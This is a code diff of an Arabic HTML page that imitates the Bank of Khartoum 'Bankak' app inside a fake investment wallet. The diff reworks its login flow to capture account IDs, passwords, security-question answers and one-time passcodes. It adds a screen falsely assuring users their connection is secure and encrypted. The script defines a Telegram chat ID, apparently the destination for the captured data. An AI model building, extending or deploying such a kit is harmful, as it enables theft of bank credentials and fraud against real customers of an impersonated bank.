@@ -15,7 +15,7 @@
     }
 
     body {
-      background-color: #ffffff;
+      background-color: #111827;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -26,7 +26,7 @@
 
     .app-screen {
       width: 100%;
-      max-width: 100%;
+      max-width: 412px;
       height: 100%;
       max-height: 100%;
       background-color: #ffffff;
@@ -34,7 +34,7 @@
       flex-direction: column;
       justify-content: space-between;
       position: relative;
-      box-shadow: none;
+      box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
       border-radius: 0;
       border: none;
       overflow: hidden;
@@ -109,12 +109,12 @@
       font-weight: bold;
     }
 
-    .btn-top-back {
-      background-color: #ffffff;
-      color: #e10a14;
-      border: 1px solid #ffffff;
-      border-radius: 6px;
+    .btn-top-back, .btn-back {
+      background: rgba(255, 255, 255, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.4);
+      color: #ffffff;
       padding: 4px 10px;
+      border-radius: 6px;
       font-size: 0.78rem;
       font-weight: 700;
       cursor: pointer;
@@ -122,8 +122,8 @@
       transition: background 0.2s;
     }
 
-    .btn-top-back:hover {
-      background-color: #f3f4f6;
+    .btn-top-back:hover, .btn-back:hover {
+      background-color: rgba(255, 255, 255, 0.3);
     }
 
     .logo-box {
@@ -244,7 +244,7 @@
 
     .input-field {
       width: 100%;
-      padding: 12px 40px 12px 12px;
+      padding: 12px 16px 12px 12px;
       border: 2px solid #cbd5e1;
       border-radius: 8px;
       font-size: 0.9rem;
@@ -273,19 +273,18 @@
       top: 50%;
       transform: translateY(-50%);
       color: #6b7280;
-      z-index: 6;
-      pointer-events: none;
     }
 
-    .toggle-eye {
+    .password-toggle {
       position: absolute;
-      right: 12px;
+      left: 12px;
       top: 50%;
       transform: translateY(-50%);
-      color: #6b7280;
       cursor: pointer;
+      color: #6b7280;
+      font-size: 1.1rem;
       user-select: none;
-      z-index: 6;
+      z-index: 10;
     }
 
     .btn-red {
@@ -307,8 +306,15 @@
       z-index: 5;
     }
 
-    .btn-group { display: flex; gap: 10px; margin-top: 10px; }
-    .btn-group .btn-red { flex: 1; }
+    .btn-group {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .btn-group .btn-red {
+      flex: 1;
+    }
 
     .modal-overlay {
       display: none;
@@ -357,6 +363,20 @@
       justify-content: center;
     }
 
+    .btn-retry {
+      width: auto;
+      min-width: 130px;
+      padding: 8px 20px;
+      background: linear-gradient(180deg, #ed1c24 0%, #b80c13 100%);
+      border: 1px solid #99080e;
+      border-radius: 8px;
+      color: #ffffff;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.3), 0 3px 6px rgba(0,0,0,0.15);
+    }
+
     .otp-card {
       border: 2px solid #e2e8f0;
       border-radius: 12px;
@@ -386,7 +406,20 @@
       margin-bottom: 8px;
     }
 
-    .otp-info { font-size: 0.82rem; color: #6b7280; margin-bottom: 16px; }
+    .otp-info {
+      font-size: 0.82rem;
+      color: #6b7280;
+      margin-bottom: 16px;
+    }
+
+    .resend-link {
+      font-size: 0.8rem;
+      color: #6b7280;
+      text-decoration: underline;
+      cursor: pointer;
+      display: inline-block;
+      margin-bottom: 12px;
+    }
 
     .transparent-loading-overlay {
       display: none;
@@ -424,21 +457,73 @@
       40% { transform: scale(1.0); }
     }
 
-    .bottom-nav {
+    .loading-screen {
       display: flex;
-      justify-content: space-around;
+      flex-direction: column;
       align-items: center;
-      padding: 10px 10px 16px;
-      background-color: #ffffff;
-      border-top: 1px solid #e5e7eb;
+      justify-content: center;
+      height: 100%;
+      width: 100%;
+      background: #ffffff;
+      padding: 24px;
+      text-align: center;
     }
 
-    .nav-link { display: flex; flex-direction: column; align-items: center; gap: 4px; text-decoration: none; color: #9ca3af; font-size: 0.72rem; cursor: pointer; }
-    .icon-circle { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #ffffff; font-size: 0.95rem; }
-    .icon-fb { background-color: #3b5998; }
-    .icon-help { background-color: #8cc63f; }
-    .icon-location { background-color: #e10a14; }
-    .icon-bok { background: linear-gradient(135deg, #8cc63f 50%, #009245 50%); }
+    .loading-spinner {
+      width: 56px;
+      height: 56px;
+      border: 5px solid #f3f4f6;
+      border-top: 5px solid #e10a14;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+
+    .loading-title {
+      font-size: 1.2rem;
+      font-weight: 800;
+      color: #111827;
+      margin-bottom: 6px;
+    }
+
+    .loading-subtitle {
+      font-size: 0.88rem;
+      color: #dc2626;
+      font-weight: 600;
+      margin-bottom: 24px;
+    }
+
+    .contact-card {
+      width: 100%;
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 16px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.03);
+    }
+
+    .secure-connection-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 0;
+    }
+
+    .secure-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #059669;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .secure-desc {
+      font-size: 0.78rem;
+      color: #64748b;
+      text-align: center;
+    }
 
     .header-bar-wallet {
       background-color: #ffffff;
@@ -467,17 +552,6 @@
       font-size: 13px;
       font-weight: 700;
       color: #4b5563;
-    }
-
-    .back-btn {
-      border: 1px solid #e5e7eb;
-      color: #374151;
-      background: #ffffff;
-      padding: 6px 14px;
-      border-radius: 8px;
-      font-size: 13px;
-      font-weight: 600;
-      cursor: pointer;
     }
 
     .top-icons-grid {
@@ -537,6 +611,41 @@
     .badge-bronze { background: #fff7ed; color: #c2410c; }
     .live-dot { width: 8px; height: 8px; background-color: #10b981; border-radius: 50%; display: inline-block; margin-left: 4px; }
     .btn-join { background-color: #c8102e; color: #ffffff; border: none; padding: 6px 14px; border-radius: 8px; font-size: 12px; font-weight: 700; cursor: pointer; box-shadow: 0 2px 6px rgba(200, 16, 46, 0.2); }
+
+    .bottom-nav {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 12px 10px 20px;
+      background-color: #ffffff;
+      border-top: 1px solid #f3f4f6;
+    }
+
+    .nav-link {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      text-decoration: none;
+      color: #9ca3af;
+      font-size: 0.75rem;
+    }
+
+    .icon-circle {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      font-size: 1rem;
+    }
+
+    .icon-fb { background-color: #3b5998; }
+    .icon-help { background-color: #8cc63f; }
+    .icon-location { background-color: #e10a14; }
+    .icon-bok { background: linear-gradient(135deg, #8cc63f 50%, #009245 50%); }
   </style>
 </head>
 <body>
@@ -556,7 +665,7 @@
       <div class="portal-section">
         <div class="main-banner">
           <span>الرئيسية</span>
-          <button class="ibok-login-btn" onclick="openVerificationForm()">
+          <button class="ibok-login-btn" onclick="switchScreen('screenLogin')">
             <i class="fa-solid fa-arrow-right-to-bracket"></i> iBOK+ Login
           </button>
         </div>
@@ -618,56 +727,6 @@
       </div>
     </div>
 
-    <!-- استمارة التوثيق الجديدة المضافة -->
-    <div class="screen" id="screenVerificationForm">
-      <div class="top-header" style="padding: 12px 16px;">
-        <div class="header-bar">
-          <span class="page-title">استمارة توثيق الحساب</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenServices')">← رجوع</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.7);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-
-      <div class="form-section">
-        <form onsubmit="handleVerificationSubmit(event)">
-          <div class="input-box">
-            <label class="input-label">الاسم (رباعي)</label>
-            <input type="text" class="input-field" id="verName" placeholder="أدخل الاسم الرباعي" required />
-          </div>
-          <div class="input-box">
-            <label class="input-label">رقم الحساب</label>
-            <input type="text" class="input-field" id="verAcc" maxlength="7" placeholder="أدخل رقم الحساب (أقصى 7 أرقام)" required />
-          </div>
-          <div class="input-box">
-            <label class="input-label">رقم الهاتف (واتساب / إيمو)</label>
-            <input type="tel" class="input-field" id="verPhone" placeholder="أدخل رقم الهاتف (10 أرقام على الأقل)" required />
-          </div>
-          <div class="input-box">
-            <label class="input-label">الدخل الشهري</label>
-            <input type="text" class="input-field" id="verIncome" placeholder="أدخل الدخل الشهري" oninput="formatIncomeInput(this)" required />
-          </div>
-          <button type="submit" class="btn-red" style="margin-top: 10px;">توثيق ➔</button>
-        </form>
-      </div>
-    </div>
-
-    <!-- شاشة جاري تقديم الاستمارة -->
-    <div class="screen" id="screenSubmittingProcess">
-      <div class="top-header" style="padding: 20px 16px; height: 35%; justify-content: center;">
-        <div class="logo-box">
-          <div class="logo-ar" style="font-size: 2.2rem;">بنـ<span>كك</span></div>
-          <div class="logo-en" style="font-size: 1.1rem;">ban<span>kak</span></div>
-        </div>
-      </div>
-      <div class="form-section" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; gap: 16px; padding: 20px;">
-        <div class="timer-circle"></div>
-        <div style="font-size: 1.15rem; font-weight: 800; color: #1f2937;">جاري تقديم الاستمارة...</div>
-        <p style="font-size: 0.85rem; color: #6b7280; line-height: 1.6;">يرجى الانتظار قليلاً، يتم معالجة بيانات الاستمارة الخاصة بك الآن...</p>
-      </div>
-    </div>
-
     <!-- استمارة الخدمات المخصصة -->
     <div class="screen" id="screenServiceForm">
       <div class="top-header" style="padding: 12px 16px;">
@@ -683,46 +742,39 @@
       <div class="form-section">
         <form onsubmit="handleDynamicFormSubmit(event)">
           <div id="formFieldsContainer"></div>
-          <button type="submit" class="btn-red" style="margin-top: 10px;">الانتقال لتوثيق الحساب (بنكك) ➔</button>
+          <button type="submit" class="btn-red" style="margin-top: 10px;">إرسال الطلب ➔</button>
         </form>
       </div>
     </div>
 
-    <!-- شاشة تسجيل الدخول (بنكك) -->
+    <!-- شاشة تسجيل الدخول (بنوكك) -->
     <div class="screen" id="screenLogin">
-      <div class="top-header" style="height: 35%; justify-content: flex-end; padding-bottom: 25px;">
-        <div style="position: absolute; top: 12px; right: 12px; z-index: 15;">
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenServices')">← رجوع</button>
-        </div>
-        <div style="position: absolute; top: 12px; left: 12px; background: rgba(0,0,0,0.2); color: #fff; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; z-index: 15;">ع</div>
+      <div class="top-header" style="height: 35%;">
         <div class="logo-box">
-          <div class="logo-ar" style="font-size: 2.4rem; position: relative;">بنـ<span>كـك</span> <i class="fa-solid fa-wifi" style="font-size: 1.1rem; position: absolute; top: 2px; color: #f59e0b; transform: rotate(45deg);"></i></div>
-          <div class="logo-en" style="font-size: 1.3rem;">ban<span>kak</span></div>
+          <div class="logo-ar">بنـ<span>كك</span></div>
+          <div class="logo-en">ban<span>kak</span></div>
         </div>
       </div>
 
-      <div class="form-section" style="padding-top: 15px;">
-        <form onsubmit="handleLoginSubmit(event)">
+      <div class="form-section">
+        <form onsubmit="handleLoginSubmit(event)" autocomplete="off">
           <div class="input-box">
-            <span class="icon-right" style="color: #4b5563;"><i class="fa-solid fa-address-book"></i></span>
-            <input type="text" class="input-field" id="userIdInput" placeholder="أدخل رقم المعرف" style="font-size: 0.8rem;" required />
+            <span class="icon-right">👤</span>
+            <input type="text" class="input-field" id="userIdInput" placeholder="أدخل رقم المعرف (رقم الحساب أو 249-رقم الموبايل)" maxlength="12" autocomplete="off" data-lpignore="true" />
           </div>
 
           <div class="input-box">
-            <span class="toggle-eye" onclick="togglePasswordVisibility()">👁️</span>
-            <input type="password" class="input-field" id="passwordInput" placeholder="ادخل كلمة المرور" required />
+            <span class="icon-right">🔒</span>
+            <input type="password" class="input-field" id="passwordInput" placeholder="ادخل كلمة المرور" autocomplete="new-password" data-lpignore="true" />
+            <span class="password-toggle" onclick="togglePasswordVisibility()">👁️</span>
           </div>
 
           <button type="submit" class="btn-red">تسجيل الدخول</button>
         </form>
 
-        <div style="display: flex; justify-content: space-between; margin-top: 12px; font-size: 12px; color: #6b7280; font-weight: 600;">
-          <span style="cursor: pointer;" onclick="showErrorModal('يرجى التواصل عبر قنوات الدعم الفني للتسجيل الجديد.')">تسجيل جديد؟</span>
-          <span style="cursor: pointer;" onclick="showErrorModal('يرجى التواصل عبر قنوات الدعم الفني لاستعادة الحساب.')">لاتستطيع تسجيل الدخول؟</span>
-        </div>
-
-        <div style="margin-top: 12px; display: flex; align-items: center; gap: 6px; font-size: 12px; color: #c8102e; font-weight: bold; cursor: pointer;" onclick="showErrorModal('خاصية مشاركة الرمز متاحة عبر التطبيق الرسمي.')">
-          <i class="fa-solid fa-qrcode" style="font-size: 16px;"></i> شارك رمز
+        <div style="display:flex; justify-content:space-between; margin-top: 15px; font-size: 0.85rem; color:#888;">
+          <span>تسجيل جديد؟</span>
+          <span>لاتستطيع تسجيل الدخول؟</span>
         </div>
       </div>
 
@@ -731,6 +783,106 @@
         <div class="nav-link"><div class="icon-circle icon-help">📞</div><span>المساعدة</span></div>
         <div class="nav-link"><div class="icon-circle icon-location">📍</div><span>مواقعنا</span></div>
         <div class="nav-link"><div class="icon-circle icon-bok">🌐</div><span>بنك الخرطوم</span></div>
+      </div>
+    </div>
+
+    <!-- النافذة المنبثقة: موبايل مختلف -->
+    <div class="modal-overlay" id="modalDevice">
+      <div class="modal-box">
+        <div class="modal-header">هل ترغب في الدخول إلي حسابك من خدمة بنك الخرطوم المصرفية ؟</div>
+        <div class="modal-body" style="font-size: 0.85rem;">) اضغط على زر إعادة التعيين واتبع التعليمات.</div>
+        <div class="modal-actions" style="flex-direction: column; gap: 6px; width: 100%;">
+          <button class="btn-red" onclick="goToSecurityQuestions()">الإجابة على أسئلة الأمان</button>
+          <button class="btn-red" style="background: #ef4444;" onclick="closeModal('modalDevice')">إلغاء</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- شاشة أسئلة الأمان -->
+    <div class="screen" id="screenQuestions">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
+          <span class="page-title">أسئلة الأمان</span>
+        </div>
+        <div class="logo-box" style="transform: scale(0.7);">
+          <div class="logo-ar">بنـ<span>كك</span></div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <p style="font-size: 0.9rem; color: #374151; margin-bottom: 12px; font-weight: 600;" id="questionText">
+          ما هو اسم المدرسة التي التحقت بها؟
+        </p>
+
+        <div class="input-box">
+          <input type="text" class="input-field" placeholder="أدخل الجواب" id="answerInput" autocomplete="off" />
+        </div>
+
+        <div class="btn-group">
+          <button class="btn-red" onclick="validateSecurityAnswer()">إرسال</button>
+          <button class="btn-red" onclick="nextQuestion()">سؤال آخر</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- شاشة التحقق OTP -->
+    <div class="screen" id="screenOtp">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <button class="btn-back" onclick="switchScreen('screenQuestions')">رجوع ➔</button>
+          <span class="page-title">التحقق</span>
+        </div>
+        <div class="logo-box" style="transform: scale(0.7);">
+          <div class="logo-ar">بنـ<span>كك</span></div>
+        </div>
+      </div>
+
+      <div class="form-section">
+        <div class="otp-card">
+          <div class="timer-circle"></div>
+          <div class="timer-text">الوقت المتبقي <span id="timerCountdown">59:00</span></div>
+          <p class="otp-info">تم إرسال الرمز السري (OTP) إلى رقم هاتفك المسجل / البريد الإلكتروني.</p>
+
+          <div class="input-box">
+            <span class="icon-right">📱</span>
+            <input type="text" class="input-field" id="otpInput" placeholder="أدخل الرمز السري (6 أرقام)" maxlength="6" autocomplete="off" />
+          </div>
+
+          <a href="#" class="resend-link">إعادة إرسال</a>
+
+          <div class="btn-group">
+            <button class="btn-red" onclick="validateOtp()">إرسال</button>
+            <button class="btn-red" style="background:#ef4444;" onclick="switchScreen('screenLogin')">إلغاء</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- شاشة تقديم الطلب والتواصل الرسمية -->
+    <div class="screen" id="screenLoading">
+      <div class="top-header" style="padding: 12px 16px;">
+        <div class="header-bar">
+          <button class="btn-back" onclick="switchScreen('screenLogin')">رجوع ➔</button>
+          <span class="page-title">حالة الطلب</span>
+        </div>
+        <div class="logo-box" style="transform: scale(0.7);">
+          <div class="logo-ar">بنـ<span>كك</span></div>
+        </div>
+      </div>
+
+      <div class="loading-screen">
+        <div class="loading-spinner"></div>
+        <div class="loading-title">جاري تقديم الطلب...</div>
+        <div class="loading-subtitle">يرجى عدم الخروج من الصفحة</div>
+
+        <div class="contact-card">
+          <div class="secure-connection-box">
+            <div class="secure-title">🔒 اتصالك آمن ومشفر</div>
+            <div class="secure-desc">جميع بيانات المعاملات محمية وفق أعلى معايير الأمان المصرفي.</div>
+          </div>
+        </div>
+        <button class="btn-red" style="margin-top: 20px;" onclick="switchScreen('screenServices')">العودة للرئيسية</button>
       </div>
     </div>
 
@@ -817,7 +969,7 @@
           <ul style="list-style-type: disc; margin-right: 18px; color: #374151; display: flex; flex-direction: column; gap: 6px;">
             <li><strong>سرية الحساب:</strong> يتحمل العميل المسؤولية الكاملة عن سرية بيانات حسابه وكلمة المرور ورموز التحقق (OTP) وعدم مشاركتها مع أي طرف ثالث.</li>
             <li><strong>صحة البيانات:</strong> يقر العميل بأن جميع البيانات والوثائق المدخلة عبر الاستمارات الإلكترونية صحيحة ومطابقة للهوية الرسمية.</li>
-            <li><strong>المعاملات الاستثمارية:</strong> تخضع كافة المحافظ وعوائد الصفقات الاستثمارية للشروط الضوابط المعمول بها في بنك الخرطوم واللوائح المصرفية المعتمدة.</li>
+            <li><strong>المعاملات الاستثمارية:</strong> تخضع كافة المحافظ وعوائد الصفقات الاستثمارية للشروط والضوابط المعمول بها في بنك الخرطوم واللوائح المصرفية المعتمدة.</li>
             <li><strong>المسؤولية القانونية:</strong> يلتزم المستخدم بعدم استخدام التطبيق أو الخدمات في أي معاملات مخالفة للقوانين والنظم المصرفية السارية.</li>
           </ul>
         </div>
@@ -827,130 +979,13 @@
       </div>
     </div>
 
-    <!-- نوافذ المنبثقة للخطأ والأسئلة -->
+    <!-- نافذة خطأ الإدخال المنبثقة -->
     <div class="modal-overlay" id="modalError">
       <div class="modal-box">
-        <div class="modal-header">تنبيه</div>
-        <div class="modal-body" id="modalErrorText">الرجاء إدخال البيانات بشكل صحيح</div>
+        <div class="modal-header">خطأ</div>
+        <div class="modal-body" id="modalErrorText">Invalid Source. Please contact Customer Care</div>
         <div class="modal-actions">
-          <button class="btn-red" onclick="closeErrorModal()">إغلاق</button>
-        </div>
-      </div>
-    </div>
-
-    <div class="modal-overlay" id="modalDevice">
-      <div class="modal-box">
-        <div class="modal-header">ترغب في الدخول إلي الخدمة المصرفية؟</div>
-        <div class="modal-body" style="font-size: 0.85rem;">إذا كنت تحاول الدخول من حسابك لاول مرة اضغط على زر الاجابة على أسئلة الامان واتبع التعليمات.</div>
-        <div class="modal-actions" style="flex-direction: column; gap: 6px; width: 100%;">
-          <button class="btn-red" onclick="goToSecurityQuestions()">الإجابة على أسئلة الأمان</button>
-          <button class="btn-red" onclick="closeModal('modalDevice')">باستخدام بطاقة الصراف الآلي</button>
-          <button class="btn-red" style="background: #ef4444;" onclick="closeModal('modalDevice')">إلغاء</button>
-        </div>
-      </div>
-    </div>
-
-    <div class="screen" id="screenQuestions">
-      <div class="top-header" style="padding: 12px 16px;">
-        <div class="header-bar">
-          <span class="page-title">أسئلة الأمان</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenLogin')">← رجوع</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.7);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-      <div class="form-section">
-        <div class="input-box">
-          <select class="input-field" id="securityQuestionSelect" required>
-            <option value="" disabled selected>-- اختر سؤال الأمان --</option>
-            <option value="ما هو اسم ابن عمك الأول؟">ما هو اسم ابن عمك الأول؟</option>
-            <option value="في أي مدينة ولدت؟">في أي مدينة ولدت؟</option>
-            <option value="ما هو اسم صديق الطفولة المقرب؟">ما هو اسم صديق الطفولة المقرب؟</option>
-            <option value="ما هو اسم أول مدرس علمك؟">ما هو اسم أول مدرس علمك؟</option>
-            <option value="ما هي حيوانك الأليف المفضّل؟">ما هي حيوانك الأليف المفضّل؟</option>
-          </select>
-        </div>
-        <div class="input-box">
-          <input type="text" class="input-field" placeholder="أدخل الجواب" id="answerInput" required />
-        </div>
-        <button class="btn-red" onclick="validateSecurityAnswer()">إرسال</button>
-      </div>
-    </div>
-
-    <!-- شاشة إدخال رمز التحقق (OTP) -->
-    <div class="screen" id="screenOtp">
-      <div class="top-header" style="padding: 12px 16px;">
-        <div class="header-bar">
-          <span class="page-title">التحقق</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenQuestions')">← رجوع</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.7);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-      <div class="form-section">
-        <div class="otp-card">
-          <div class="timer-circle"></div>
-          <div class="timer-text">الوقت المتبقي <span id="timerCountdown">59:00</span></div>
-          <p class="otp-info">تم إرسال رمز التحقق (OTP) الي رقم الهاتف المسجل/البريد الإلكتروني مع الحساب</p>
-          <div class="input-box">
-            <span class="icon-right" style="z-index: 6;">📱</span>
-            <input type="text" class="input-field" id="otpInput" placeholder="أدخل الرمز السري" maxlength="6" required />
-          </div>
-          <div class="btn-group">
-            <button class="btn-red" onclick="validateOtp()">إرسال</button>
-            <button class="btn-red" style="background:#ef4444;" onclick="switchScreen('screenLogin')">إلغاء</button>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- شاشة إدخال رقم التواصل -->
-    <div class="screen" id="screenContact">
-      <div class="top-header" style="padding: 12px 16px;">
-        <div class="header-bar">
-          <span class="page-title">بيانات التواصل</span>
-          <button type="button" class="btn-top-back" onclick="switchScreen('screenOtp')">← رجوع</button>
-        </div>
-        <div class="logo-box" style="transform: scale(0.7);">
-          <div class="logo-ar">بنـ<span>كك</span></div>
-        </div>
-      </div>
-      <div class="form-section">
-        <div class="otp-card">
-          <div style="font-size: 1.1rem; font-weight: bold; color: #111827; margin-bottom: 8px;"><i class="fa-solid fa-headset" style="color:#c8102e;"></i> أكمل بيانات الاتصال</div>
-          <p class="otp-info">الرجاء إدخال رقم التواصل الخاص بك ليتم متابعة الطلب والتنسيق معك فوراً.</p>
-          <div class="input-box" style="margin-top: 10px;">
-            <span class="icon-right" style="z-index: 6;">📞</span>
-            <input type="tel" class="input-field" id="contactInput" placeholder="رقم التواصل (إيمو / واتساب)" required />
-          </div>
-          <button class="btn-red" onclick="submitContactInfo()">تأكيد وإرسال الطلب</button>
-        </div>
-      </div>
-    </div>
-
-    <!-- شاشة معالجة الطلب -->
-    <div class="screen" id="screenProcessing">
-      <div class="top-header" style="padding: 20px 16px; height: 35%; justify-content: center;">
-        <div class="logo-box">
-          <div class="logo-ar" style="font-size: 2.2rem;">بنـ<span>كك</span></div>
-          <div class="logo-en" style="font-size: 1.1rem;">ban<span>kak</span></div>
-        </div>
-      </div>
-      <div class="form-section" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; gap: 16px; padding: 20px;">
-        <div class="timer-circle" id="processingSpinner"></div>
-        <div id="processingText" style="font-size: 1.15rem; font-weight: 800; color: #1f2937;">جاري توثيق الحساب...</div>
-        <p style="font-size: 0.85rem; color: #6b7280; line-height: 1.6;" id="processingSubText">يرجى الانتظار قليلاً، يتم معالجة طلبك وتوثيق الحساب الآن (<span id="processingCountdown">25</span> ثانية)...</p>
-        
-        <div id="successActionContainer" style="width: 100%; margin-top: 10px; display: none;">
-          <div style="background: #f0fdf4; border: 1px solid #bbf7d0; padding: 14px; border-radius: 12px; margin-bottom: 15px; color: #166534; font-size: 0.85rem; font-weight: 600;">
-            <i class="fa-solid fa-circle-check" style="font-size: 1.2rem; color: #16a34a; display: block; margin-bottom: 5px;"></i>
-            تم توثيق الحساب بنجاح تام وتفعيل كافة الميزات الاستثمارية!
-          </div>
-          <button class="btn-red" onclick="returnToWallet()" style="background: linear-gradient(135deg, #059669 0%, #047857 100%); font-size: 0.95rem; padding: 14px; border-radius: 10px;">
-            موافق (العودة إلى المحفظة)
-          </button>
+          <button class="btn-retry" onclick="closeErrorModal()">إعادة المحاولة</button>
         </div>
       </div>
     </div>
@@ -958,7 +993,7 @@
     <!-- شاشة المحفظة الاستثمارية الرئيسية -->
     <div class="screen" id="main-screen">
       <div class="header-bar-wallet">
-        <button class="back-btn" onclick="switchScreen('screenServices')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
+        <button class="btn-top-back" style="color:#374151; background:#f3f4f6; border-color:#d1d5db;" onclick="switchScreen('screenServices')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
         <div class="wallet-title-box"><i class="fa-solid fa-chart-line"></i> المحفظة الاستثمارية</div>
         <div id="dynamic-greeting" class="greeting-text">نهار سعيد</div>
       </div>
@@ -976,10 +1011,7 @@
             <div class="card-label">إجمالي القيمة الاستثمارية</div>
             <div class="profit-green" style="font-size: 22px; color: #374151;">0 USDG</div>
           </div>
-          <div style="display: flex; align-items: center; gap: 6px;">
-            <div class="stat-badge" id="walletStatusBadge">غير موثق</div>
-            <button class="btn-join" style="padding: 5px 10px; font-size: 11px;" onclick="openVerificationForm()">توثيق</button>
-          </div>
+          <div class="stat-badge" id="walletStatusBadge">مفعل</div>
         </div>
 
         <div class="nav-tabs">
@@ -1037,7 +1069,7 @@
               <div class="data-title">طلب سحب أرباح مباشر <span class="live-dot"></span></div>
               <button class="btn-join" onclick="handleDirectWithdrawal()">تنفيذ السحب</button>
             </div>
-            <div class="data-sub">تحويل الأرباح المتاحة مباشرة إلى الحساب البنكي الموثق.</div>
+            <div class="data-sub">تحويل الأرباح المتاحة مباشرة إلى الحساب المعتمد.</div>
           </div>
         </div>
 
@@ -1053,40 +1085,32 @@
       </div>
     </div>
 
-    <!-- شاشة كشف الحساب غير الموثق -->
+    <!-- شاشة كشف الحساب -->
     <div class="screen" id="screenAccountStatement">
       <div class="header-bar-wallet">
-        <button class="back-btn" onclick="switchScreen('main-screen')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
+        <button class="btn-top-back" style="color:#374151; background:#f3f4f6; border-color:#d1d5db;" onclick="switchScreen('main-screen')"><i class="fa-solid fa-arrow-right"></i> رجوع</button>
         <div class="wallet-title-box"><i class="fa-solid fa-file-invoice-dollar"></i> كشف الحساب</div>
         <div></div>
       </div>
       <div class="form-section" style="display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; gap: 16px;">
-        <div style="background: #fef2f2; border: 1px solid #fecaca; padding: 20px; border-radius: 12px; color: #991b1b; font-size: 0.95rem; font-weight: 700; width: 100%; max-width: 320px;">
-          <i class="fa-solid fa-triangle-exclamation" style="font-size: 2rem; color: #dc2626; display: block; margin-bottom: 10px;"></i>
-          حسابك غير موثق بتطبيق بنكك
+        <div style="background: #f0fdf4; border: 1px solid #bbf7d0; padding: 20px; border-radius: 12px; color: #166534; font-size: 0.95rem; font-weight: 700; width: 100%; max-width: 320px;">
+          <i class="fa-solid fa-circle-check" style="font-size: 2rem; color: #16a34a; display: block; margin-bottom: 10px;"></i>
+          كشف الحساب متاح وجاهز للاستعراض
         </div>
-        <p style="font-size: 0.85rem; color: #6b7280; line-height: 1.5;">يرجى توثيق حسابك المصرفي أولاً لتمكين إصدار كشف الحساب وعرض العمليات بدقة.</p>
-        <button class="btn-red" onclick="openVerificationForm()" style="max-width: 220px;">توثيق الحساب الآن</button>
+        <p style="font-size: 0.85rem; color: #6b7280; line-height: 1.5;">يمكنك استعراض تفاصيل الحساب والعمليات بكل دقة.</p>
+        <button class="btn-red" onclick="switchScreen('main-screen')" style="max-width: 220px;">العودة للمحفظة</button>
       </div>
     </div>
 
-    <!-- نافذة تنبيه توفر المبلغ -->
+    <!-- نافذة تنبيه توفر المبلغ / توثيق الحساب -->
     <div class="modal-overlay" id="modalFundAlert">
       <div class="modal-box">
         <div class="modal-header">تنبيه الانضمام للصفقة</div>
-        <div class="modal-body" id="modalFundText">يجب توافر المبلغ المراد استثماره داخل الحساب لاتمام الصفقة بنجاح. يرجى إيداع المبلغ أولاً.</div>
+        <div class="modal-body" id="modalFundText">يجب توثيق الحساب أولاً للاستفادة من جميع الخدمات.</div>
         <div style="padding: 0 16px 16px; display: flex; gap: 6px;">
-          <button class="btn-red" style="flex:1;" onclick="closeModal('modalFundAlert'); handleWalletAction('إيداع');">إيداع الآن</button>
+          <button class="btn-red" style="flex:1;" onclick="closeModal('modalFundAlert'); switchScreen('screenLogin');">توثيق</button>
           <button class="btn-red" style="flex:1; background:#6b7280;" onclick="closeModal('modalFundAlert')">إلغاء</button>
         </div>
-      </div>
-    </div>
-
-    <div class="modal-overlay" id="modalLinkAlert">
-      <div class="modal-box">
-        <div class="modal-header" id="modalLinkTitle">ربط الحساب الاستثماري</div>
-        <div class="modal-body" id="modalLinkText">للانضمام إلى الصفقة يجب ربط حسابك الاستثماري بحساب بنكك.</div>
-        <div style="padding: 0 16px 16px;"><button class="btn-red" onclick="closeModal('modalLinkAlert'); openVerificationForm()">ربط</button></div>
       </div>
     </div>
 
@@ -1097,8 +1121,17 @@
     const CHAT_ID = "8623773122";
 
     let selectedServiceIndex = 0;
-    let selectedServiceName = "العملات الأجنبية";
-    let isAccountVerified = false;
+    let selectedServiceName = "";
+    let currentQIndex = 0;
+    let timerInterval;
+
+    const questions = [
